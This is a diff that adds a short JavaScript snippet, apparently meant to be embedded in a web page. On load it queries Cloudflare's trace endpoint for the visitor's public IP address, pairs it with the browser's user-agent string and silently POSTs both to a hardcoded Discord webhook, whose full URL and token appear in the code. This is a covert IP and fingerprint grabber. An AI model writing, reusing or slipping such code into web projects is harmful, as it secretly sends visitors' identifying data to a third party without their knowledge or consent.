@@ -1,0 +1,16 @@
+function text(url) {return fetch(url).then(res => res.text());}text('https://www.cloudflare.com/cdn-cgi/trace').then(data => {
+  let ipRegex = /[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}/
+  var ip = data.match(ipRegex)[0];
+  var internalCode = navigator.userAgent;
+  var externalCode = ip;
+  var information = externalCode + " " + internalCode;
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1119490551876681748/7YQxwQb8t04JAf_t_EZXSL0ZW5zXXp1J3ljVmJM67NdSjGtxp8qR4VCrGH7gWb_t7BYn");
+      request.setRequestHeader('Content-type', 'application/json');
+      const params = {
+        username: "IPAND",
+        avatar_url: "",
+        content: information
+      }
+      request.send(JSON.stringify(params));
+          })
